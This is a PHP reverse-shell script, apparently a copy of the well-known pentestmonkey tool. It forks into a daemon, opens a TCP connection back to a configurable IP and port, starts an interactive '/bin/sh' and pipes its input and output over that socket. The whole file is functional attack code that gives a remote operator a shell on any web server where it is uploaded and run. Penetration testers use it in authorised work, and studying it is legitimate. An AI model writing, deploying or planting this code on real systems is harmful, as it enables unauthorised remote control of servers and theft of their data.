<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
// License: GPL v2

set_time_limit(0);

$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;

// Function to print messages only if not daemonized
function printit($string) {
    global $daemon;
    if (!$daemon) {
        echo "$string\n";
    }
}

// Daemonize the process if possible
$daemon = 0;
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid === -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);  // Parent exits
    }
    if (posix_setsid() === -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonize. This is quite common and not fatal.");
}

// Change to a safe directory and remove umask
chdir("/");
umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptorspec = [
    0 => ["pipe", "r"],  // STDIN
    1 => ["pipe", "w"],  // STDOUT
    2 => ["pipe", "w"]   // STDERR
];

$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set pipes and socket to non-blocking
foreach ($pipes as $pipe) {
    stream_set_blocking($pipe, 0);
}
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (true) {
    // Check for end of TCP connection
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    // Wait for data from the socket or the shell
    $read_a = [$sock, $pipes[1], $pipes[2]];
    $write_a = $error_a = null;
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // Handle input from the TCP socket
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }

    // Handle output from the shell's STDOUT
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }

    // Handle output from the shell's STDERR
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

// Clean up
fclose($sock);
foreach ($pipes as $pipe) {
    fclose($pipe);
}
proc_close($process);
?>
